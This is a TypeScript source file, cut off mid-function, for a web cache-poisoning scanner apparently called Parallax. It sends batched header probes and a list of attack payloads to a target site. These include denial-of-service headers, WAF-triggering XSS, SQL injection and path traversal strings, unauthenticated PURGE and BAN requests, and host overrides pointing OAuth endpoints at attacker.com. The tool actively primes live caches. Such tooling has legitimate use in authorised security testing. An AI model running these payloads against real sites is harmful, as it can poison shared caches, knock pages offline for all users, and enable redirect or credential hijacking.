import { createHash } from 'crypto';
import { CachePoisonConfig, PoisonFinding, PoisonResult, DiffSignal, CacheKeyOracle } from './types';
import { HttpClient, HttpResponse } from './http-client';

/**
 * CachePoison — Binary search header testing + exploit classification (WCP)
 *
 * From Parallax blog: "Testing 10,244 headers sequentially would require 10,244 requests.
 * Instead, I batch headers into groups of 20, send all 20 in a single request with a shared
 * canary, and diff against the baseline. If the group shows no signal, I skip all 20 headers
 * in one request. If it shows a signal, I binary search within the group (~5 requests) to
 * isolate which header(s) caused it. 10,244 headers → ~512 groups + ~50 binary searches ~ 560 requests."
 */
export class CachePoison {
  private config: CachePoisonConfig;
  public findings: PoisonFinding[] = [];
  private http: HttpClient;

  // CDN default-keyed headers to skip (from blog)
  private static CDN_KEYED_HEADERS: Record<string, Set<string>> = {
    cloudflare: new Set([
      'x-forwarded-host', 'x-host', 'x-original-url', 'x-rewrite-url',
      'x-forwarded-scheme', 'forwarded', 'origin',
      'x-http-method-override', 'x-method-override'
    ]),
    cloudfront: new Set(),
    akamai: new Set(),
    fastly: new Set()
  };

  private static AKAMAI_DEBUG_HEADERS = {
    'Pragma': 'akamai-x-cache-on, akamai-x-get-true-cache-key, akamai-x-check-cacheable'
  };

  private static SECURITY_HEADERS = [
    'content-security-policy', 'x-frame-options', 'strict-transport-security',
    'cross-origin-resource-policy', 'cross-origin-opener-policy',
    'cross-origin-embedder-policy', 'permissions-policy',
    'x-content-type-options', 'x-xss-protection'
  ];

  private static WAF_STATUSES = new Set([403, 406, 418, 451]);

  // HCache CP-DoS payloads (56 total across 4 classes)
  static CPDOS_PAYLOADS = [
    // Class 1: Traditional CP-DoS (oversized/conflicting)
    { name: 'x-oversized-header', value: 'A'.repeat(8192), class: 'cpdos', desc: 'Oversized header → 431' },
    { name: 'transfer-encoding', value: 'chunked, identity', class: 'cpdos', desc: 'Conflicting TE → 400/502' },
    { name: 'content-length', value: '99999', class: 'cpdos', desc: 'Bogus CL on GET → 400' },
    { name: 'accept-encoding', value: 'gzip, '.repeat(2000) + 'gzip', class: 'cpdos', desc: 'Encoding list bomb → 400' },

    // Class 1b: RFC-compliant malformed values
    { name: 'if-match', value: '"nonexistent-etag-value"', class: 'cpdos', desc: 'HCache: non-matching ETag → 412' },
    { name: 'if-modified-since', value: 'Thu, 01 Jan 2099 00:00:00 GMT', class: 'cpdos', desc: 'HCache: future date → 304' },
    { name: 'if-none-match', value: '"*"', class: 'cpdos', desc: 'HCache: weak validator → 304' },
    { name: 'if-range', value: 'invalid-etag', class: 'cpdos', desc: 'HCache: malformed If-Range → 412/400' },

    { name: 'range', value: 'bytes=cow', class: 'cpdos', desc: 'HCache: non-numeric range → 416' },
    { name: 'range', value: 'bytes=9-4', class: 'cpdos', desc: 'HCache: reversed range → 416' },
    { name: 'range', value: 'bytes=-0', class: 'cpdos', desc: 'HCache: zero suffix-length → 416' },
    { name: 'range', value: 'invalid', class: 'cpdos', desc: 'HCache: missing bytes= prefix → 400' },

    { name: 'upgrade', value: 'WebSocket', class: 'cpdos', desc: 'HCache: WebSocket without handshake → 426' },
    { name: 'upgrade', value: 'h2c', class: 'cpdos', desc: 'HCache: cleartext HTTP/2 upgrade → 426' },

    // Metacharacter injection
    { name: 'x-metachar-test', value: 'foo\x01bar', class: 'cpdos', desc: 'Meta-char: SOH control char in header' },
    { name: 'accept', value: 'text/html\x01', class: 'cpdos', desc: 'Meta-char: SOH in Accept header' },
    { name: 'x-metachar-test', value: 'foo\x08bar', class: 'cpdos', desc: 'Meta-char: BS control char' },
    { name: 'x-metachar-test', value: 'foo\x1bbar', class: 'cpdos', desc: 'Meta-char: ESC control char' },
    { name: 'x-metachar-test', value: 'foo\x7fbar', class: 'cpdos', desc: 'Meta-char: DEL control char' },

    // Class 2: WAF Poisoning (16 payloads)
    { name: 'user-agent', value: 'sqlmap/1.0', class: 'waf_poison', desc: 'WAF: sqlmap UA → cached 403' },
    { name: 'user-agent', value: 'Nikto/2.1.6', class: 'waf_poison', desc: 'WAF: Nikto UA → cached 403' },
    { name: 'user-agent', value: 'Nessus SOAP', class: 'waf_poison', desc: 'WAF: Nessus UA → cached 403' },
    { name: 'user-agent', value: 'masscan/1.3', class: 'waf_poison', desc: 'WAF: masscan UA → cached 403' },
    { name: 'referer', value: 'http://spam-domain.example.com', class: 'waf_poison', desc: 'WAF: spam referer → cached 403' },
    { name: 'x-custom-header', value: '<script>alert(1)</script>', class: 'waf_poison', desc: 'WAF: XSS pattern → cached 403' },
    { name: 'x-custom-header', value: "' OR 1=1 --", class: 'waf_poison', desc: 'WAF: SQLi pattern → cached 403' },
    { name: 'x-custom-header', value: '../../../etc/passwd', class: 'waf_poison', desc: 'WAF: traversal pattern → cached 403' },
    { name: 'user-agent', value: 'ffuf/v2.0.0', class: 'waf_poison', desc: 'WAF: ffuf UA → cached 403' },
    { name: 'user-agent', value: 'nuclei/v3.0.0', class: 'waf_poison', desc: 'WAF: nuclei UA → cached 403' },
    { name: 'user-agent', value: 'WPScan', class: 'waf_poison', desc: 'WAF: WPScan UA → cached 403' },
    { name: 'user-agent', value: 'gobuster', class: 'waf_poison', desc: 'WAF: gobuster UA → cached 403' },
    { name: 'user-agent', value: 'DirBuster', class: 'waf_poison', desc: 'WAF: DirBuster UA → cached 403' },
    { name: 'user-agent', value: 'Burp Suite', class: 'waf_poison', desc: 'WAF: Burp UA → cached 403' },
    { name: 'user-agent', value: 'curl/', class: 'waf_poison', desc: 'WAF: curl UA → cached 403' },
    { name: 'user-agent', value: 'python-requests/', class: 'waf_poison', desc: 'WAF: requests UA → cached 403' },

    // Class 3: Fragment forwarding (CVE-2021-27577)
    { name: 'fragment', value: '%23<script>alert(1)</script>', class: 'fragment', desc: 'Fragment forwarding → %23 decoded to # at origin' },

    // Class 4: Cache invalidation methods
    { name: 'PURGE', value: '', class: 'invalidation', desc: 'Unauthenticated PURGE accepted' },
    { name: 'BAN', value: '', class: 'invalidation', desc: 'Unauthenticated BAN accepted' },
    { name: 'REFRESH', value: '', class: 'invalidation', desc: 'Unauthenticated REFRESH accepted' },
    { name: 'INVALIDATE', value: '', class: 'invalidation', desc: 'Unauthenticated INVALIDATE accepted' },
    { name: 'FASTLYPURGE', value: '', class: 'invalidation', desc: 'Unauthenticated FASTLYPURGE accepted' },

    // Next.js ISR/SSG
    { name: 'x-middleware-prefetch', value: '1', class: 'nextjs', desc: 'CVE-2024-46982: ISR caches JSON/RSC instead of HTML' },
    { name: 'rsc', value: '1', class: 'nextjs', desc: 'React Server Component request manipulation' },
    { name: 'next-router-state-tree', value: '{"":""}', class: 'nextjs', desc: 'Next.js layout poisoning via router state tree' },

    // Import hijacking
    { name: 'import-hijack', value: 'test', class: 'import_hijack', desc: 'Cached redirect on import URLs' },

    // Illegal header names (raw sockets required)
    { name: 'illegal-header-soh', value: 'X-Illegal\x01Test', class: 'illegal_header', desc: 'Illegal header name: SOH in name' },
    { name: 'illegal-header-space', value: 'X-Illegal Test', class: 'illegal_header', desc: 'Illegal header name: space in name' },
    { name: 'illegal-header-colon', value: 'X-Illegal:Test', class: 'illegal_header', desc: 'Illegal header name: colon in name' },
    { name: 'illegal-header-tab', value: 'X-Illegal\tTest', class: 'illegal_header', desc: 'Illegal header name: tab in name' },
    { name: 'illegal-header-del', value: 'X-Illegal\x7fTest', class: 'illegal_header', desc: 'Illegal header name: DEL in name' },

    // Payload splitting
    { name: 'payload-split', value: 'split-test', class: 'payload_split', desc: 'Canary split across header + cookie' },

    // Surrogate-Key/Control injection
    { name: 'surrogate-key', value: 'attacker-controlled', class: 'surrogate', desc: 'Surrogate-Key injection controls purge groups' },
    { name: 'surrogate-control', value: 'max-age=31536000', class: 'surrogate', desc: 'Surrogate-Control: extends TTL to 1 year' },
    { name: 'cdn-cache-control', value: 'max-age=31536000, public', class: 'surrogate', desc: 'CDN-Cache-Control: Cloudflare TTL extension' },

    // OAuth/OIDC endpoint poisoning
    { name: 'oidc-config', value: 'test', class: 'oauth', desc: 'Poison .well-known/openid-configuration' },
    { name: 'x-forwarded-host', value: 'attacker.com', class: 'oauth', desc: 'Host override on OAuth endpoints' },
    { name: 'x-forwarded-prefix', value: '/malicious', class: 'oauth', desc: 'Prefix override on OAuth endpoints' },
    { name: 'x-original-url', value: '/oauth/authorize', class: 'oauth', desc: 'Original URL override on OAuth' },

    // Multi-CDN layer mismatch
    { name: 'x-forwarded-host-multi', value: 'attacker.com', class: 'multi_cdn', desc: 'Multi-CDN: outer keys, inner unkeys' },
    { name: 'x-forwarded-proto-multi', value: 'http', class: 'multi_cdn', desc: 'Multi-CDN: proto override inner cache' },
    { name: 'x-forwarded-port-multi', value: '80', class: 'multi_cdn', desc: 'Multi-CDN: port override inner cache' },
    { name: 'x-forwarded-prefix-multi', value: '/malicious', class: 'multi_cdn', desc: 'Multi-CDN: prefix override inner cache' },
    { name: 'x-original-url-multi', value: '/internal', class: 'multi_cdn', desc: 'Multi-CDN: original URL override inner' },
    { name: 'x-rewrite-url-multi', value: '/internal', class: 'multi_cdn', desc: 'Multi-CDN: rewrite URL override inner' }
  ];

  constructor(config: CachePoisonConfig, httpClient?: HttpClient) {
    this.config = config;
    this.http = httpClient || new HttpClient({ timeoutMs: 10000, rateLimitPerSec: 10 });
  }

  /** Wire the Stage-2 harvested wordlist (HCache/BigQuery-derived) — replaces synthetic fallback. */
  setHarvestedWordlist(wordlist: { fast: string[]; all: string[] }): void {
    this.config.wordlist = wordlist;
  }

  async run(cachedUrls: Array<{ url: string }>, wordlistTier: 'fast' | 'all' = 'fast'): Promise<PoisonFinding[]> {
    const headers = this.getHeaderWordlist(wordlistTier);
    const cdnName = this.config.cdnName || 'unknown';
    const keyedHeaders = CachePoison.CDN_KEYED_HEADERS[cdnName] || new Set();
    const testHeaders = headers.filter(h => !keyedHeaders.has(h.toLowerCase()));
    const ordered = this.reorderHeaders(testHeaders, cdnName);

    // Get baseline response
    const baseline = await this.http.get(this.config.target, this.config.headers || {});

    const batchSize = 20;
    for (let i = 0; i < ordered.length; i += batchSize) {
      const batch = ordered.slice(i, i + batchSize);
      const batchResult = await this.testBatch(batch, baseline);

      if (batchResult.hasSignal) {
        const isolated = await this.binarySearch(batch, baseline);
        for (const finding of isolated) {
          const { oracle, confirmed } = await this.cacheKeyOracle(finding);
          finding.oracle = oracle;
          if (confirmed) {
            const classified = this.classifyExploit(finding);
            this.findings.push(classified);
            await this.runAdditionalModules(classified);
          }
        }
      }
    }

    // CP-DoS / WCP header-class payloads (separate, non-binary-search pass)
    try {
      const cpdosFindings = await this.testCPDoS(this.config.target);
      this.findings.push(...cpdosFindings);
    } catch {
      // CP-DoS pass is best-effort; never fail the scan
    }

    return this.findings;
  }

  /**
   * Header wordlist for the poisoning pass.
   * `fast`: curated CDN-priority headers first, then harvested top-tier list.
   * `all`: curated + full harvested list (HCache/BigQuery) — real headers only,
   * no synthetic filler. Falls back to curated when Stage 2 harvest is absent.
   */
  getHeaderWordlist(tier: 'fast' | 'all'): string[] {
    const curated = [
      'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-for', 'x-forwarded-port',
      'x-forwarded-prefix', 'x-original-url', 'x-rewrite-url', 'x-host',
      'forwarded', 'origin', 'x-forwarded-scheme', 'x-url-scheme',
      'x-forwarded-ssl', 'x-forwarded-path', 'x-http-method-override',
      'x-method-override', 'content-type', 'accept', 'accept-encoding',
      'user-agent', 'referer', 'cookie', 'x-requested-with',
      'x-csrf-token', 'x-xsrf-token', 'authorization',
      'x-api-key', 'x-client-id', 'x-tenant-id', 'x-request-id',
      'x-correlation-id', 'x-trace-id', 'baggage', 'traceparent',
    ];
    const harvested = this.config.wordlist;
    if (!harvested) return curated;
    const extra = tier === 'fast' ? harvested.fast : harvested.all;
    const seen = new Set(curated.map(h => h.toLowerCase()));
    const merged = [...curated];
    for (const header of extra) {
      const key = header.toLowerCase();
      if (!seen.has(key)) {
        seen.add(key);
        merged.push(header);
      }
    }
    return merged;
  }

  private reorderHeaders(headers: string[], cdnName: string): string[] {
    const cdnPriority: Record<string, string[]> = {
      cloudflare: ['x-forwarded-host', 'x-host', 'origin', 'x-forwarded-scheme'],
      cloudfront: ['x-forwarded-host', 'host', 'x-forwarded-proto'],
      fastly: ['x-forwarded-host', 'x-forwarded-proto', 'host'],
      akamai: ['x-forwarded-host', 'x-forwarded-proto', 'host', 'x-forwarded-for']
    };

    const priority = cdnPriority[cdnName] || ['x-forwarded-host', 'host', 'origin'];
    const contentNeg = ['accept', 'accept-encoding', 'accept-language', 'accept-charset'];
    const methodOverride = ['x-http-method-override', 'x-method-override', 'x-http-method'];

    const prioritySet = new Set(priority);
    const contentNegSet = new Set(contentNeg);
    const methodOverrideSet = new Set(methodOverride);

    const ordered: string[] = [];
    for (const h of priority) if (headers.includes(h)) ordered.push(h);
    for (const h of contentNeg) if (headers.includes(h) && !prioritySet.has(h)) ordered.push(h);
    for (const h of methodOverride) if (headers.includes(h) && !prioritySet.has(h)) ordered.push(h);
    for (const h of headers) if (!prioritySet.has(h) && !contentNegSet.has(h) && !methodOverrideSet.has(h)) ordered.push(h);

    return ordered;
  }

  async testBatch(headers: string[], baseline: HttpResponse): Promise<{ hasSignal: boolean }> {
    const canary = this.generateCanary();
    const url = new URL(this.config.target);
    url.searchParams.set('_pc_cb', canary);

    const batchHeaders: Record<string, string> = { ...(this.config.headers || {}) };
    for (const h of headers) {
      batchHeaders[h] = `PARALLAX-${canary}`;
    }

    const response = await this.http.get(url.toString(), batchHeaders);
    const signals = this.compareResponses(baseline, response, canary);
    return { hasSignal: this.anySignal(signals) };
  }

  async binarySearch(headers: string[], baseline: HttpResponse): Promise<PoisonFinding[]> {
    if (headers.length === 1) {
      const finding = await this.testSingleHeader(headers[0], baseline);
      return finding ? [finding] : [];
    }

    if (headers.length <= 5) {
      const results: PoisonFinding[] = [];
      for (const h of headers) {
        const finding = await this.testSingleHeader(h, baseline);
        if (finding) results.push(finding);
      }
      return results;
    }

    const mid = Math.floor(headers.length / 2);
    const left = headers.slice(0, mid);
    const right = headers.slice(mid);

    const leftResult = await this.testBatch(left, baseline);
    const rightResult = await this.testBatch(right, baseline);

    const results: PoisonFinding[] = [];

    if (leftResult.hasSignal) {
      results.push(...await this.binarySearch(left, baseline));
    }
    if (rightResult.hasSignal) {
      results.push(...await this.binarySearch(right, baseline));
    }

    // AND-gate: if neither half alone had signal, test full batch
    if (!leftResult.hasSignal && !rightResult.hasSignal) {
      const fullResult = await this.testBatch(headers, baseline);
      if (fullResult.hasSignal) {
        for (let i = 0; i < left.length; i++) {
          for (let j = 0; j < right.length; j++) {
            const pairResult = await this.testBatch([left[i], right[j]], baseline);
            if (pairResult.hasSignal) {
              const f1 = await this.testSingleHeader(left[i], baseline);
              const f2 = await this.testSingleHeader(right[j], baseline);
              if (f1) results.push(f1);
              if (f2) results.push(f2);
            }
          }
        }
      }
    }

    return results;
  }

async testSingleHeader(header: string, baseline: HttpResponse): Promise<PoisonFinding | null> {
    const canary = this.generateCanary();
    const url = new URL(this.config.target);
    url.searchParams.set('_pc_cb', canary);

    const headers: Record<string, string> = { ...(this.config.headers || {}) };
    headers[header] = `PARALLAX-${canary}`;

    const response = await this.http.get(url.toString(), headers);
    const signals = this.compareResponses(baseline, response, canary);

    if (!this.anySignal(signals)) return null;

    return {
      inputType: 'header',
      inputName: header,
      canary,
      signals,
      oracle: {} as any,
      classification: 'unknown',
      attackClass: 'content_poison',
      confidence: 'POSSIBLE',
      blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
    };
  }

  async cacheKeyOracle(finding: PoisonFinding): Promise<{ oracle: CacheKeyOracle; confirmed: boolean }> {
    const canary = finding.canary;
    const url = new URL(this.config.target);
    url.searchParams.set('_pc_cb', canary);

    const pinnedUA = 'Parallax-Oracle/1.0';

    // Prime WITH header
    const primeHeaders: Record<string, string> = { ...(this.config.headers || {}) };
    primeHeaders[finding.inputName] = `PARALLAX-${canary}`;
    primeHeaders['User-Agent'] = pinnedUA;
    const primeResp = await this.http.get(url.toString(), primeHeaders);

    // Wait for cache
    await this.sleep(300);

    // Verify WITHOUT header, same cachebuster, same UA
    const verifyHeaders: Record<string, string> = { ...(this.config.headers || {}) };
    verifyHeaders['User-Agent'] = pinnedUA;
    const verifyResp = await this.http.get(url.toString(), verifyHeaders);

    // If canary persists → header NOT in cache key → confirmed unkeyed
    const canaryPersisted = verifyResp.body.includes(canary);

    const oracle: CacheKeyOracle = {
      header: finding.inputName,
      canary,
      cachebuster: canary,
      pinnedUA,
      primeResponse: {
        status: primeResp.status,
        headers: primeResp.headers,
        bodyPreview: primeResp.body.substring(0, 500),
        bodyHash: primeResp.bodyHash,
        cacheStatus: primeResp.fromCache ? 'HIT' : 'MISS',
        timing: primeResp.timingMs,
      },
      verifyResponse: {
        status: verifyResp.status,
        headers: verifyResp.headers,
        bodyPreview: verifyResp.body.substring(0, 500),
        bodyHash: verifyResp.bodyHash,
        cacheStatus: verifyResp.fromCache ? 'HIT' : 'MISS',
        timing: verifyResp.timingMs,
      },
      canaryPersisted,
    };

    return { oracle, confirmed: canaryPersisted };
  }

  private hashBody(body: string): string {
    return createHash('sha256').update(body).digest('hex');
  }

  classifyExploit(finding: PoisonFinding): PoisonFinding {
    const s = finding.signals;
    const body = s.bodyReflection;
    const hdrs = Object.keys(s.headerReflection).length > 0;
    const status = s.statusChanged;
    const sec = Object.keys(s.securityHeaderChanges).length > 0;

    // Check for session fixation - Set-Cookie header reflection
    const setCookieReflection = s.headerReflection['set-cookie'] !== undefined;
    
    // Check for CSP bypass - CSP header weakened
    const cspWeakened = s.securityHeaderChanges['content-security-policy'] !== undefined;

    if (body && s.bodyContext === 'script_tag') {
      finding.classification = 'xss';
      finding.attackClass = 'content_poison';
    } else if (body && s.bodyContext === 'attribute_url') {
      finding.classification = 'open_redirect';
      finding.attackClass = 'content_poison';
    } else if (setCookieReflection) {
      finding.classification = 'session_fixation';
      finding.attackClass = 'header_poison';
    } else if (cspWeakened) {
      finding.classification = 'csp_bypass';
      finding.attackClass = 'header_poison';
    } else if (status) {
      finding.classification = 'cpdos';
      finding.attackClass = 'cpdos';
    } else if (sec) {
      finding.classification = 'security_header_poisoning';
      finding.attackClass = 'header_poison';
    } else if (hdrs) {
      finding.classification = 'behaviour_poisoning';
      finding.attackClass = 'header_poison';
    } else {
      finding.classification = 'behaviour_poisoning';
      finding.attackClass = 'content_poison';
    }

    finding.confidence = 'LIKELY';
    return finding;
  }

  async testCPDoS(url: string): Promise<PoisonFinding[]> {
    const findings: PoisonFinding[] = [];
    const baseline = await this.http.get(url, this.config.headers || {});

    for (const payload of CachePoison.CPDOS_PAYLOADS) {
      if (payload.class === 'illegal_header') continue; // Raw socket required

      try {
        const headers: Record<string, string> = { ...(this.config.headers || {}) };
        headers[payload.name] = payload.value;
        const response = await this.http.get(url, headers);

        let confirmed = false;
        if (payload.class === 'cpdos' && (response.status >= 400 || response.status === 304)) {
          confirmed = true;
        } else if (payload.class === 'waf_poison' && CachePoison.WAF_STATUSES.has(response.status)) {
          // Verify it's actually cached by checking cache status header or timing
          confirmed = response.fromCache === true || response.timingMs < baseline.timingMs * 0.8;
        } else if (payload.class === 'fragment' && response.status === 200) {
          confirmed = response.body !== baseline.body;
        } else if (payload.class === 'invalidation' && (response.status === 200 || response.status === 204)) {
          // Check if cache was actually purged - would need follow-up test
          confirmed = true;
        } else if (payload.class === 'nextjs' && response.status === 200) {
          // Check for content-type confusion (ISR caching JSON as HTML)
          const contentType = response.headers['content-type'] || '';
          confirmed = contentType.includes('application/json') || contentType.includes('text/html');
        } else if (payload.class === 'surrogate' && (response.status === 200 || response.status === 204)) {
          // Check if surrogate headers were actually processed (TTL extension)
          const surrogateControl = response.headers['surrogate-control'] || response.headers['cdn-cache-control'];
          confirmed = !!surrogateControl;
        } else if (payload.class === 'oauth' && response.status === 200) {
          // Only confirm if authorization_endpoint is actually reflected
          confirmed = response.body.includes('authorization_endpoint');
        } else if (payload.class === 'multi_cdn' && response.status === 200) {
          // Only confirm if attacker.com is actually reflected in response
          confirmed = response.body.includes('attacker.com');
        }

        if (confirmed) {
          findings.push({
            inputType: 'header',
            inputName: payload.name,
            canary: payload.value,
            signals: {
              bodyReflection: false, headerReflection: {},
              statusChanged: baseline.status !== response.status,
              sizeDeltaPercent: 0, newHeaders: [],
              securityHeaderChanges: {},
            },
            oracle: {} as any,
            classification: payload.class as any,
            attackClass: payload.class === 'cpdos' ? 'cpdos' : 'header_poison',
            confidence: 'CONFIRMED',
            blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
          });
        }
      } catch {
        // Skip failed requests
      }
    }

    return findings;
  }

  private compareResponses(baseline: HttpResponse, attack: HttpResponse, canary?: string): DiffSignal {
    const CF_EMAIL_RE = /data-cfemail="[a-f0-9]+"/gi;
    const norm1 = baseline.body.replace(CF_EMAIL_RE, 'data-cfemail="REMOVED"');
    const norm2 = attack.body.replace(CF_EMAIL_RE, 'data-cfemail="REMOVED"');

    let bodyReflection = false;
    if (canary) {
      bodyReflection = norm2.includes(canary);
    } else {
      bodyReflection = norm2.includes(norm1.substring(0, 50)) && norm1 !== norm2;
    }

    const headerReflection: Record<string, string> = {};
    for (const [key, value] of Object.entries(baseline.headers)) {
      if (attack.headers[key] && attack.headers[key] !== value) {
        headerReflection[key] = value;
      }
    }

    const statusChanged = baseline.status !== attack.status;
    const sizeDeltaPercent = baseline.body.length > 0
      ? Math.abs(attack.body.length - baseline.body.length) / baseline.body.length * 100
      : 0;

    const newHeaders: string[] = [];
    for (const key of Object.keys(attack.headers)) {
      if (!baseline.headers[key]) newHeaders.push(key);
    }

    const securityHeaderChanges: Record<string, { before: string; after: string }> = {};
    for (const h of CachePoison.SECURITY_HEADERS) {
      if (baseline.headers[h] && attack.headers[h] && baseline.headers[h] !== attack.headers[h]) {
        securityHeaderChanges[h] = { before: baseline.headers[h], after: attack.headers[h] };
      }
    }

    let bodyContext: DiffSignal['bodyContext'] = 'generic';
    if (attack.body.includes('<script')) bodyContext = 'script_tag';
    else if (attack.body.includes('href=') || attack.body.includes('src=')) bodyContext = 'attribute_url';
    else if (attack.body.includes('<link')) bodyContext = 'link_tag';
    else if (attack.body.includes('<meta')) bodyContext = 'meta_tag';

    return {
      bodyReflection, headerReflection, statusChanged, sizeDeltaPercent,
      newHeaders, securityHeaderChanges, bodyContext,
    };
  }

  private anySignal(s: DiffSignal): boolean {
    return s.bodyReflection || Object.keys(s.headerReflection).length > 0 ||
      s.statusChanged || s.sizeDeltaPercent > 5 || s.newHeaders.length > 0 ||
      Object.keys(s.securityHeaderChanges).length > 0;
  }

  private async runAdditionalModules(finding: PoisonFinding): Promise<void> {
    const url = this.config.target;
    const baseHeaders = this.config.headers || {};

    // 1. Fragment forwarding
    await this.testFragmentForwarding(url, baseHeaders);

    // 2. Cache invalidation methods
    await this.testCacheInvalidation(url, baseHeaders);

    // 3. Next.js ISR
    await this.testNextJS(url, baseHeaders);

    // 4. Import hijacking
    await this.testImportHijacking(url, baseHeaders, finding);

    // 5. Payload splitting
    await this.testPayloadSplitting(url, baseHeaders);

    // 6. Surrogate-Key/Control
    await this.testSurrogateKeys(url, baseHeaders);

    // 7. OAuth/OIDC
    await this.testOAuth(url, baseHeaders);

    // 8. Multi-CDN mismatch
    await this.testMultiCDN(url, baseHeaders);

    // 9. Parameter cloaking (Kettle)
    await this.testParameterCloaking(url, baseHeaders);
  }

  private async testFragmentForwarding(url: string, headers: Record<string, string>): Promise<void> {
    const canary = `<script>alert(1)</script>`;
    const testUrl = `${url}%23${canary}`;
    const resp = await this.http.get(testUrl, headers);
    if (resp.status === 200 && resp.body.includes(canary)) {
      this.findings.push({
        inputType: 'fragment', inputName: 'fragment', canary,
        signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
        oracle: {} as any, classification: 'fragment', attackClass: 'content_poison', confidence: 'LIKELY',
        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
      });
    }
  }

  private async testCacheInvalidation(url: string, headers: Record<string, string>): Promise<void> {
    const methods = ['PURGE', 'BAN', 'REFRESH', 'INVALIDATE', 'FASTLYPURGE'];
    for (const method of methods) {
      try {
        const fetch = (await import('node-fetch')).default;
        const resp = await fetch(url, { method, headers, signal: AbortSignal.timeout(5000) });
        if (resp.status === 200 || resp.status === 204) {
          this.findings.push({
            inputType: 'header', inputName: method, canary: '',
            signals: { bodyReflection: false, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
            oracle: {} as any, classification: 'invalidation', attackClass: 'header_poison', confidence: 'CONFIRMED',
            blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
          });
        }
      } catch { /* skip */ }
    }
  }

  private async testNextJS(url: string, headers: Record<string, string>): Promise<void> {
    // Only test Next.js if framework is detected as Next.js
    if (this.config.framework !== 'nextjs' && !this.config.headers?.['x-nextjs-data']) {
      return;
    }
    const payloads = [
      { name: 'x-middleware-prefetch', value: '1' },
      { name: 'rsc', value: '1' },
      { name: 'next-router-state-tree', value: '{"":""}' },
    ];
    for (const p of payloads) {
      const resp = await this.http.get(url, { ...headers, [p.name]: p.value });
      // Check for content-type change indicating ISR caching wrong content type
      const isJson = resp.headers['content-type']?.includes('application/json');
      const isHtml = resp.headers['content-type']?.includes('text/html');
      if (resp.status === 200 && (isJson || isHtml)) {
        this.findings.push({
          inputType: 'header', inputName: p.name, canary: p.value,
          signals: { bodyReflection: false, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
          oracle: {} as any, classification: 'nextjs', attackClass: 'content_poison', confidence: 'POSSIBLE',
          blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
        });
      }
    }
  }

  private async testImportHijacking(url: string, headers: Record<string, string>, finding: PoisonFinding): Promise<void> {
    if (finding.classification !== 'open_redirect') return;
    const redirectUrl = new URL(url);
    redirectUrl.searchParams.set('_pc_import', 'test');
    const resp = await this.http.get(redirectUrl.toString(), headers);
    const scriptMatches = resp.body.match(/<script[^>]+src=["']([^"']+)["']/g);
    const linkMatches = resp.body.match(/<link[^>]+href=["']([^"']+)["']/g);
    const imports = [...(scriptMatches || []), ...(linkMatches || [])];
    if (imports.length > 0) {
      this.findings.push({
        inputType: 'header', inputName: 'import-hijack', canary: 'test',
        signals: { bodyReflection: false, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
        oracle: {} as any, classification: 'import_hijacking', attackClass: 'content_poison', confidence: 'LIKELY',
        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
      });
    }
  }

  private async testPayloadSplitting(url: string, headers: Record<string, string>): Promise<void> {
    const canary = Math.random().toString(36).substring(2, 8);
    const splitHeaders = { ...headers, 'x-split': canary.substring(0, 3), 'cookie': `split=${canary.substring(3)}` };
    const resp = await this.http.get(url, splitHeaders);
    if (resp.body.includes(canary)) {
      this.findings.push({
        inputType: 'header', inputName: 'payload-split', canary,
        signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
        oracle: {} as any, classification: 'payload_splitting', attackClass: 'content_poison', confidence: 'LIKELY',
        blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
      });
    }
  }

  private async testSurrogateKeys(url: string, headers: Record<string, string>): Promise<void> {
    const payloads = [
      { name: 'surrogate-key', value: 'attacker-controlled' },
      { name: 'surrogate-control', value: 'max-age=31536000' },
      { name: 'cdn-cache-control', value: 'max-age=31536000, public' },
    ];
    for (const p of payloads) {
      const resp = await this.http.get(url, { ...headers, [p.name]: p.value });
      // Check if server echoes Surrogate-Control in response (Fastly/Varnish behavior)
      // or if CDN-Cache-Control is reflected (Cloudflare)
      const echoed = resp.headers['surrogate-control'] || resp.headers['cdn-cache-control'];
      if (echoed && echoed.includes(p.value)) {
        this.findings.push({
          inputType: 'header', inputName: p.name, canary: p.value,
          signals: { bodyReflection: false, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
          oracle: {} as any, classification: 'surrogate', attackClass: 'header_poison', confidence: 'POSSIBLE',
          blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
        });
      }
    }
  }

  private async testOAuth(url: string, headers: Record<string, string>): Promise<void> {
    const endpoints = ['/.well-known/openid-configuration', '/oauth/authorize', '/oauth/token'];
    const hostHeaders = ['x-forwarded-host', 'x-forwarded-prefix', 'x-original-url'];
    for (const ep of endpoints) {
      const testUrl = new URL(url);
      testUrl.pathname = ep;
      for (const hh of hostHeaders) {
        const resp = await this.http.get(testUrl.toString(), { ...headers, [hh]: 'attacker.com' });
        if (resp.status === 200 && resp.body.includes('authorization_endpoint')) {
          this.findings.push({
            inputType: 'header', inputName: hh, canary: 'attacker.com',
            signals: { bodyReflection: true, headerReflection: {}, statusChanged: false, sizeDeltaPercent: 0, newHeaders: [], securityHeaderChanges: {} },
            oracle: {} as any, classification: 'oauth_hijacking', attackClass: 'content_poison', confidence: 'CONFIRMED',
            blastRadius: { scope: 'global', deviceTypes: ['desktop'] },
          });
        }
      }
    }
  }

  private async testMultiCDN(url: string, headers: Record<string, string>): Promise<void> {
    const multiHeaders = ['x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-port', 'x-forwarded-prefix', 'x-original-url', 'x-rewrite-url'];
    for (const h of multiHeaders) {
      const resp = await this.http.get(url, { ...headers, [h]: 'attacker.com' });
      if (resp.status === 200 && resp.body.includes('attacker.com')) {
        this.findings.push({
          inputType: 'header', inputName: h, canary: 'attacker.com',
